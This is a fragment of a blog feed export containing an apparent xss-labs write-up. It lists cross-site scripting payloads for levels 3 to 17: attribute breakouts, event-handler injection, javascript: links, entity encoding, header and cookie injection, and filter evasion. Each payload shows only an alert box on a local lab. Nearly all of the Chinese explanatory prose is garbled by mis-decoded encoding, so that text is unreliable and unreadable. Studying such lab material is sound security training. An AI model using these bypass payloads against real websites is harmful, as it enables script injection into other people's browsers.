<p>å°±å¯ä»¥æˆåŠŸææƒä¸ºrootäº†ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
      <tags>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>XSSæ€»ç»“</title>
    <url>/2023/07/22/XSS%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>


<ul>
<li><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="leval3"><a href="#leval3" class="headerlink" title="leval3"></a>leval3</h3><p>leval2æ²¡æœ‰ä½¿ç”¨<strong>htmlspecialchars</strong>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å…¥</p>
<blockquote>
<p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</blockquote>
<p>ä½†æ˜¯level4ä½¿ç”¨äº†<strong>htmlspecialchars</strong>å‡½æ•°</p>
<blockquote>
<p>å®šä¹‰å’Œç”¨æ³•<br>htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚<br><img src="https://img-blog.csdnimg.cn/5e76f1783f0b4526a25482dc6c9d664a.png" alt="1"></p>
</blockquote>
<p>æ‰€ä»¥ä¸ºäº†é¿å…è¿™äº›å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>äº‹ä»¶æ³¨å…¥</strong>ï¼Œé€šè¿‡é—­åˆvalueå€¼ï¼Œç„¶åå†ç”¨onclickå¼¹çª—ï¼Œä¹Ÿå³æ˜¯</p>
<blockquote>
<p><code>&#39;onclick=&#39;alert(1)</code></p>
</blockquote>
<p>å†™é‡Œé¢ä¹‹åå†ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†å°±ä¼šå¼¹çª—äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/0587c61ee365484b930177737361d966.png" alt="1"><br>å…¶å®ä¸Šé¢æ‹¼æ¥ä¹‹åå°±æ˜¯</p>
<blockquote>
<p><code>&lt;input name=keyword  value=&#39;&#39;onclick=&#39;alert(1)&#39;&gt;</code>è¿™å°±å¥½ç†è§£å¤šäº†</p>
</blockquote>
<p>è¿™é‡Œçœ‹åˆ°<code>&lt;input</code>å°±åº”è¯¥æƒ³åˆ°è¿™ä¸ªonclick</p>
<blockquote>
<p><code>&lt;input onclick=alert(11) &gt;</code>è¿™ä¸ªå°±æ˜¯åŸºç¡€çš„å¼¹æ¡†</p>
</blockquote>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>ä¸Šé¢çš„äº‹ä»¶æ³¨å…¥ç…§æ ·ä¹Ÿå¯ä»¥ã€‚<br>æ˜¯è¿™é‡Œé¢ä»–å¹¶æ²¡æœ‰ä½¿ç”¨<strong>htmlspecialchars</strong>ï¼Œè€Œæ˜¯å°†è¾“å…¥çš„<code>&lt;ã€&gt;</code>ä¸¤ä¸ªå­—ç¬¦ç»™ç½®ç©ºäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/474c4cee9e9b47a3994c148fdbe5c6fe.png" alt="1"></p>
<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="https://img-blog.csdnimg.cn/8a3a29c1c49e4dbe89bc5097276b2b3e.png" alt="1"><br>è¿™é‡Œä¸Šé¢ä¸¤ä¸ªéƒ½ä¸èƒ½ç”¨äº†ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹<code>&quot;&gt;&lt;input+onclick=alert(1)+&gt;//</code>ç»“æœç›´æ¥ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»è¾“å…¥æ¡†ä¹Ÿæ²¡ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬æ‰€è¾“å…¥çš„å°±æ˜¯&#x3D;&#x3D;$str&#x3D;&#x3D;çš„å€¼ï¼Œè¿™æ ·ä¹Ÿé¿å…ä¸äº†è¢«æ›¿æ¢ã€‚<br><img src="https://img-blog.csdnimg.cn/982889f914994b1288a26c6cb160f3bb.png" alt="1"><br>è¿™æ—¶å€™è¦æƒ³åˆ°ä½¿ç”¨å¦ä¸€ç§å¼¹çª—æ–¹æ³•<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>ï¼Œè¿™é‡Œè¾“å…¥</p>
<blockquote>
<p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p>
</blockquote>
<p>ç„¶åæˆ‘æ ‡è®°çš„åœ°æ–¹å°±æ˜¯ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»ä¹‹åå°±ä¼šæ‰§è¡Œå¼¹çª—<br><img src="https://img-blog.csdnimg.cn/a8b6e357809a4cdba1c029dcc69f52d1.png" alt="2"></p>
<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="https://img-blog.csdnimg.cn/a0faa242e1004d579d0f14dbd48dd765.png" alt="1"><br>è¿™å…³æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ï¼Œåªéœ€è¦å°†é‚£ä¸ªå‰é¢çš„è¯­å¥æ”¹ä¸ºå¤§å†™å°±è¡Œã€‚</p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="https://img-blog.csdnimg.cn/9e4a5df41dc247d48a4edbd017e9ddea.png" alt="7"></p>
<p>å’Œä¸Šé¢˜çš„åŒºåˆ«å°±æ˜¯å¢åŠ äº†è½¬æ¢å¤§å°å†™ï¼Œè¿˜æœ‰å°†ä¸Šé¢é‚£äº›å­—ç¬¦ç»™ç½®ç©ºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡ŒåŒå†™ç»•è¿‡ã€‚</p>
<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="https://img-blog.csdnimg.cn/3adc192c19c94ffbb650b184fa0aab12.png" alt="8"></p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸Šé¢çš„æ–¹æ³•ç”¨ä¸äº†äº†ï¼Œå¤§å°å†™ã€åŒå†™éƒ½ä¸è¡Œäº†ï¼Œä¸‹é¢æ˜¯ç”¨htmlå®ä½“ç¼–ç ç»•è¿‡<br><code>javascript:alert(1)</code>çš„å®ä½“ç¼–ç ä¸º<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="https://img-blog.csdnimg.cn/e67c47475bd44f05996b85c6d4e9fc22.png" alt="9"><br>è¿™ä¸€å…³åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šæ£€æŸ¥äº†æ•°æ®ä¸­æ˜¯å¦ä¼šæœ‰**http:&#x2F;&#x2F;**å­—æ®µï¼Œè¿™é‡Œåªéœ€è¦æ”¹ä¸º<code>alert(&#39;http://&#39;)</code>å³å¯</p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><img src="https://img-blog.csdnimg.cn/2a3dd15e795d4ba78017674caccc51d2.png" alt="1"><br>åœ¨è¿™é‡Œé¢˜ç›®å°±æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œåœ¨è¿™é‡Œå”¯ä¸€èƒ½ä¸‹æ‰‹çš„å°±æ˜¯å‚æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/fe7ebe0e305f47e1a721ac46ab3e3ba9.png" alt="2"><br>é‚£ä¹ˆç”±ä¸Šé¢ä»£ç å¯ä»¥çœ‹åˆ°æœ‰ç”¨çš„å°±æ˜¯<strong>t_sort</strong>ï¼Œè€Œè¿™é‡Œ<code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>å°†å…¶éšè—äº†ã€‚</p>
<ul>
<li>è¿™ä¸ª<code>&lt;input&gt;</code>å…ƒç´ çš„ä½œç”¨æ˜¯åœ¨ä¸€ä¸ªè¡¨å•ä¸­æ·»åŠ äº†ä¸€ä¸ªéšè—çš„è¾“å…¥å­—æ®µï¼Œåç§°ä¸ºâ€t_linkâ€ï¼Œåˆå§‹å€¼ä¸ºâ€â€˜<code>$str33</code>â€˜â€œã€‚å½“ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œè¿™ä¸ªéšè—å­—æ®µçš„å€¼ä¼šè¢«åŒ…å«åœ¨è¡¨å•æ•°æ®ä¸­ï¼Œä»è€Œå¯ä»¥åœ¨åå°è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚éšè—å­—æ®µå¸¸å¸¸ç”¨äºåœ¨ä¸å½±å“ç”¨æˆ·ä½“éªŒçš„æƒ…å†µä¸‹ä¼ é€’ä¸€äº›é‡è¦çš„æ•°æ®ã€‚</li>
</ul>
<p>ç”±äºinputæ˜¯è¢«éšè—çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦å…¶ä»–æ–¹æ³•è§¦å‘ï¼Œè¿™é‡Œé‡‡ç”¨htmlçš„accesskeyå±æ€§ã€‚</p>
<ul>
<li><p>accesskey æ˜¯ HTML ä¸­çš„ä¸€ä¸ªå…¨å±€å±æ€§ï¼ˆglobal attributeï¼‰ï¼Œå®ƒç”¨äºæŒ‡å®šä¸€ä¸ªå¿«æ·é”®ï¼ˆaccess keyï¼‰æ¥æ¿€æ´»æˆ–ç„¦ç‚¹ï¼ˆfocusï¼‰ç‰¹å®šçš„å…ƒç´ ã€‚ä½¿ç”¨å¿«æ·é”®å¯ä»¥é€šè¿‡é”®ç›˜æ“ä½œæ¥å¿«é€Ÿè®¿é—®é¡µé¢ä¸Šçš„æŸäº›å…ƒç´ ï¼Œè€Œæ— éœ€ä½¿ç”¨é¼ æ ‡ã€‚<br>å½“ç”¨æˆ·æŒ‰ä¸‹æŒ‡å®šçš„å¿«æ·é”®ç»„åˆæ—¶ï¼Œä¸ accesskey å±æ€§å…³è”çš„å…ƒç´ å°†è·å¾—ç„¦ç‚¹æˆ–æ¿€æ´»ï¼Œå…·ä½“çš„è¡Œä¸ºå–å†³äºå…ƒç´ çš„ç±»å‹ã€‚é€šå¸¸ï¼Œæµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿä¼šæä¾›ä¸åŒçš„ç»„åˆé”®æ¥è§¦å‘å¿«æ·é”®ï¼Œæ¯”å¦‚åœ¨ Windows ä¸‹ä½¿ç”¨ Alt é”® + å¿«æ·é”®ï¼Œåœ¨ macOS ä¸‹ä½¿ç”¨ Control é”® + å¿«æ·é”®ã€‚</p>
</li>
<li><p>accesskey å±æ€§å¯ä»¥åº”ç”¨äºå‡ ä¹æ‰€æœ‰çš„HTMLå…ƒç´ ï¼ŒåŒ…æ‹¬é“¾æ¥ã€æŒ‰é’®ã€è¾“å…¥å­—æ®µç­‰ç­‰ã€‚</p>
</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ accesskey å±æ€§çš„ç®€å•ç¤ºä¾‹ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>accesskey ç¤ºä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>æŒ‰ä¸‹ Alt + G å¿«é€Ÿè·³è½¬åˆ° Google ç½‘ç«™ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>æŒ‰ä¸‹ Alt + S å¿«é€Ÿæäº¤è¡¨å•ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸åŒçš„æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šå¯¹ accesskey çš„æ”¯æŒæœ‰æ‰€ä¸åŒã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨<code>t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="https://img-blog.csdnimg.cn/3084e320d4da420281756af0ea730012.png" alt="11"></p>
<p>bpæŠ“åŒ…æ³¨å…¥åˆ°refererä¸­</p>
<blockquote>
<p><code>REFERER: &quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
</blockquote>
<p><strong>level12</strong><br>æ³¨å…¥åˆ°UAå¤´ä¸­ã€‚<br><strong>level13</strong><br>æ³¨å…¥cookieä¸­ã€‚</p>
<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><img src="https://img-blog.csdnimg.cn/afbe4c0cc5e547b989e0ee4a26074f81.png" alt="1"><br>äº†è§£ä¸€ä¸‹**<a href="https://www.runoob.com/angularjs/ng-ng-include.html">ng-include</a>**ï¼š<br><img src="https://img-blog.csdnimg.cn/b5fabf566c78432b89a29ede76c26f8e.png" alt="2"><br>é‚£è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨level1è¿›è¡Œå¼¹çª—</p>
<blockquote>
<p><code>http://127.0.0.1:2000/xss-labs/level15.php?src=&#39;level1.php?name=&lt;img src=asd onerror=alert(1) &gt;&#39;</code></p>
</blockquote>
<p><strong>level16</strong><br>ç©ºæ ¼è¢«è¿‡æ»¤ä½¿ç”¨æ¢è¡Œç¬¦ã€‚</p>
<blockquote>
<p><code>&lt;img%0asrc=x%0aonerror=alert(123)&gt;</code></p>
</blockquote>
<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p><img src="https://img-blog.csdnimg.cn/7cc9b86cc21f419db6105b9bcea138f8.png" alt="123"></p>
<ul>
<li><p><code>&lt;embed&gt;</code>å…ƒç´ ï¼š<code>&lt;embed&gt;</code>æ˜¯HTMLä¸­ç”¨äºåµŒå…¥å¤–éƒ¨å¤šåª’ä½“èµ„æºï¼ˆå¦‚FlashåŠ¨ç”»ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼‰çš„æ ‡ç­¾ã€‚</p>
</li>
<li><p><code>srcå±æ€§</code>ï¼šè¿™æ˜¯<code>&lt;embed&gt;</code>å…ƒç´ çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºæŒ‡å®šè¦åµŒå…¥çš„å¤–éƒ¨èµ„æºçš„URLæˆ–æ–‡ä»¶è·¯å¾„ã€‚</p>
</li>
<li><p><code>&quot;xsf01.swf?&quot;</code>ï¼šè¿™æ˜¯ä½œä¸ºsrcå±æ€§å€¼çš„å†…å®¹ã€‚å®ƒåŒ…å«äº†â€å†…å®¹â€è¿™ä¸€éƒ¨åˆ†ã€‚</p>
</li>
</ul>
<p>åˆ©ç”¨htmläº‹ä»¶å±æ€§</p>
<blockquote>
<p><code>arg01=11&amp;arg02=1 onmousedown=alert(1)</code><br><code>arg01=11&amp;arg02=1 onmouseover=alert(1)</code></p>
</blockquote>
<p>å¸¸è§çš„onmousexxxäº‹ä»¶å±æ€§ï¼š<br><img src="https://img-blog.csdnimg.cn/2a085af5a34e4826b149e8f06e710200.png" alt="3"></p>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
</blockquote>
<ul>
<li><code>&lt;img&gt;</code>: è¿™æ˜¯HTMLæ ‡ç­¾ï¼Œé€šå¸¸ç”¨äºåœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºå›¾åƒã€‚ç„¶è€Œï¼Œå®ƒä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ä½œä¸ºXSSæ”»å‡»è½½ä½“ã€‚</li>
<li><code>src=1</code>: è¿™é‡Œçš„srcæ˜¯<code>&lt;img&gt;</code>æ ‡ç­¾çš„å±æ€§ï¼Œç”¨äºæŒ‡å®šå›¾åƒçš„URLã€‚åœ¨è¿™é‡Œï¼Œå°†å›¾åƒçš„URLè®¾ç½®ä¸º1ï¼Œè¿™é€šå¸¸æ˜¯ä¸ºäº†è®©è¿™ä¸ªæ ‡ç­¾åœ¨æ˜¾ç¤ºå›¾åƒæ—¶è¯·æ±‚ä¸€ä¸ªæ— æ•ˆçš„URLï¼Œä»è€Œå¼•å‘é”™è¯¯ã€‚</li>
<li><code>onerror=alert(1)</code>: è¿™æ˜¯XSSæ”»å‡»çš„å…³é”®éƒ¨åˆ†ã€‚<code>onerror</code>æ˜¯ä¸€ä¸ªäº‹ä»¶å±æ€§ï¼Œå®ƒå…è®¸åœ¨å›¾åƒåŠ è½½å¤±è´¥æ—¶è§¦å‘ç‰¹å®šçš„JavaScriptä»£ç ã€‚åœ¨è¿™é‡Œï¼Œæ¶æ„çš„JavaScriptä»£ç æ˜¯<code>alert(1)</code>ï¼Œå®ƒä¼šå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†æ˜¾ç¤ºæ•°å­—1ã€‚</li>
</ul>
<blockquote>
<p><code>&lt;input onclick=alert(1)&gt;</code></p>
</blockquote>
<ul>
<li><p><code>&lt;input&gt;</code>ï¼šè¿™æ˜¯HTMLæ ‡ç­¾ï¼Œé€šå¸¸ç”¨äºåœ¨ç½‘é¡µä¸­åˆ›å»ºäº¤äº’å¼è¡¨å•å…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¢«ç”¨ä½œä¸€ä¸ªè¾“å…¥å…ƒç´ ã€‚</p>
</li>
<li><p><code>onclick=alert(1)</code>ï¼šè¿™æ˜¯<input>æ ‡ç­¾çš„äº‹ä»¶å±æ€§ä¹‹ä¸€ï¼Œç”¨äºå®šä¹‰å½“ç”¨æˆ·åœ¨æ­¤è¾“å…¥å…ƒç´ ä¸Šç‚¹å‡»æ—¶è¦æ‰§è¡Œçš„JavaScriptä»£ç ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScriptä»£ç æ˜¯<code>alert(1)</code>ï¼Œå®ƒå°†å¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†æ˜¾ç¤ºæ•°å­—1ã€‚</p>
</li>
</ul>
<blockquote>
<p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p>
</blockquote>
<ul>
<li><p><code>&lt;a&gt;</code>ï¼šè¿™æ˜¯HTMLä¸­ç”¨äºåˆ›å»ºé“¾æ¥çš„æ ‡ç­¾ï¼Œé€šå¸¸ç”¨äºå¯¼èˆªåˆ°å…¶ä»–é¡µé¢æˆ–èµ„æºã€‚</p>
</li>
<li><p><code>href=&quot;javascript:alert(1)&quot;</code>ï¼šè¿™æ˜¯<code>&lt;a&gt;</code>æ ‡ç­¾çš„<code>href</code>å±æ€§ï¼Œç”¨äºæŒ‡å®šé“¾æ¥çš„ç›®æ ‡åœ°å€ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>href</code>å±æ€§çš„å€¼æ˜¯<code>javascript:alert(1)</code>ã€‚è¿™æ„å‘³ç€å½“ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªé“¾æ¥æ—¶ï¼Œå°†æ‰§è¡Œå…¶ä¸­çš„JavaScriptä»£ç ï¼Œè€Œä¸æ˜¯å¯¼èˆªåˆ°ä¸€ä¸ªç½‘å€ã€‚</p>
</li>
<li><p><code>alert(1)</code>ï¼šè¿™æ˜¯JavaScriptä»£ç çš„éƒ¨åˆ†ï¼Œ<code>alert()</code>æ˜¯ä¸€ä¸ªJavaScriptå‡½æ•°ï¼Œå®ƒå°†å¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†å¹¶æ˜¾ç¤ºæ•°å­—1ã€‚</p>
</li>
</ul>
<blockquote>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
</blockquote>
<ul>
<li><code>&lt;input</code>&gt;æ ‡ç­¾ï¼šè¿™æ˜¯HTMLä¸­åˆ›å»ºè¡¨å•å…ƒç´ çš„æ ‡ç­¾ã€‚é€šè¿‡ä½¿ç”¨è¯¥æ ‡ç­¾ï¼Œå¯ä»¥åœ¨è¡¨å•ä¸­æ·»åŠ å„ç§è¾“å…¥å­—æ®µï¼Œæ¯”å¦‚æ–‡æœ¬æ¡†ã€å¤é€‰æ¡†ã€å•é€‰æŒ‰é’®ç­‰ã€‚</li>
<li><code>name=&quot;t_link&quot;</code>ï¼šè¿™æ˜¯<code>&lt;input&gt;</code>æ ‡ç­¾çš„ä¸€ä¸ªå±æ€§ã€‚å®ƒå®šä¹‰äº†è¡¨å•å…ƒç´ çš„åç§°ï¼Œè¿™ä¸ªåç§°åœ¨æäº¤è¡¨å•æ—¶ä¼šè¢«ç”¨ä½œæ•°æ®çš„æ ‡è¯†ç¬¦ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¡¨å•å…ƒç´ çš„åç§°æ˜¯â€t_linkâ€ã€‚</li>
<li><code>value=&quot;&#39;.&#39;&quot;</code>ï¼šè¿™æ˜¯<code>&lt;input&gt;</code>æ ‡ç­¾çš„å¦ä¸€ä¸ªå±æ€§ã€‚å®ƒå®šä¹‰äº†è¡¨å•å…ƒç´ çš„åˆå§‹å€¼ï¼Œå³åœ¨ç”¨æˆ·æ²¡æœ‰è¾“å…¥ä»»ä½•å€¼æ—¶ï¼Œæäº¤è¡¨å•æ—¶ä¼šä¼ é€’çš„é»˜è®¤å€¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¡¨å•å…ƒç´ çš„åˆå§‹å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²â€<code>&#39;.&#39;</code>â€œã€‚<br>-<code> type=&quot;hidden&quot;</code>ï¼šè¿™ä¹Ÿæ˜¯<code>&lt;input&gt;</code>æ ‡ç­¾çš„ä¸€ä¸ªå±æ€§ã€‚å®ƒå®šä¹‰äº†è¡¨å•å…ƒç´ çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯â€hiddenâ€ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªéšè—çš„è¾“å…¥å­—æ®µã€‚éšè—å­—æ®µä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºç»™ç”¨æˆ·ï¼Œè€Œæ˜¯ç”¨äºåœ¨åå°ä¼ é€’æ•°æ®ã€‚</li>
</ul>
<blockquote>
<p><code>&lt;button onmouseover=&quot;alert(1)&quot;&gt;æ‚¬åœåœ¨æˆ‘ä¸Šé¢å°±ä¼šå¼¹çª—&lt;/button&gt;</code></p>
</blockquote>
<ul>
<li>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæœ‰ä¸€ä¸ªæŒ‰é’®å…ƒç´ (<code>&lt;button&gt;</code>)ï¼Œå®ƒå…·æœ‰ onmouseover å±æ€§ã€‚è¿™æ„å‘³ç€å½“ç”¨æˆ·å°†é¼ æ ‡æ‚¬åœåœ¨æŒ‰é’®ä¸Šæ—¶ï¼Œä¼šè§¦å‘ onmouseover äº‹ä»¶ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„ JavaScript ä»£ç ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå½“ç”¨æˆ·æ‚¬åœåœ¨æŒ‰é’®ä¸Šæ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†æ˜¾ç¤ºæ•°å­— â€œ1â€ã€‚</li>
</ul>
<blockquote>
<p><code>&lt;input accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;&gt;</code></p>
</blockquote>
<ul>
<li><p><code>accesskey=&quot;x&quot;</code>ï¼šè¿™æ˜¯ä¸€ä¸ª input å…ƒç´ çš„ accesskey å±æ€§ã€‚å®ƒæŒ‡å®šäº†åœ¨é¡µé¢ä¸Šé€šè¿‡é”®ç›˜æ¿€æ´»è¯¥å…ƒç´ æ‰€éœ€è¦ä½¿ç”¨çš„å¿«æ·é”®ã€‚åœ¨è¿™é‡Œï¼Œaccesskey&#x3D;â€xâ€ è¡¨ç¤ºç”¨æˆ·å¯ä»¥é€šè¿‡æŒ‰ä¸‹ Alt (æˆ–åœ¨ macOS ä¸‹æ˜¯ Control) é”® + â€œxâ€ é”®æ¥æ¿€æ´»è¯¥è¾“å…¥å­—æ®µã€‚</p>
</li>
<li><p><code>onclick=&quot;alert(1)&quot;</code>ï¼šè¿™æ˜¯ä¸€ä¸ª input å…ƒç´ çš„ onclick å±æ€§ã€‚å®ƒæŒ‡å®šäº†å½“ç”¨æˆ·ç‚¹å‡»ï¼ˆå•å‡»ï¼‰è¯¥å…ƒç´ æ—¶è¦æ‰§è¡Œçš„ JavaScript ä»£ç ã€‚åœ¨è¿™é‡Œï¼Œonclick&#x3D;â€alert(1)â€ è¡¨ç¤ºå½“ç”¨æˆ·ç‚¹å‡»è¯¥è¾“å…¥å­—æ®µæ—¶ï¼Œå°†ä¼šå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†æ˜¾ç¤ºæ•°å­— â€œ1â€ã€‚</p>
</li>
<li><p><code>type=&quot;text&quot;</code>ï¼šè¿™æ˜¯ä¸€ä¸ª input å…ƒç´ çš„ type å±æ€§ã€‚å®ƒå®šä¹‰äº†è¾“å…¥å­—æ®µçš„ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œtype&#x3D;â€textâ€ è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ–‡æœ¬è¾“å…¥å­—æ®µï¼Œç”¨æˆ·å¯ä»¥åœ¨è¯¥è¾“å…¥å­—æ®µä¸­è¾“å…¥æ–‡æœ¬ã€‚</p>
</li>
</ul>
<p><strong>æ‹“å±•ä¸€ä¸ª</strong></p>
<ul>
<li><p>type&#x3D;â€textâ€: æ–‡æœ¬è¾“å…¥å­—æ®µï¼Œç”¨äºæ¥å—ä»»æ„æ–‡æœ¬ã€‚</p>
</li>
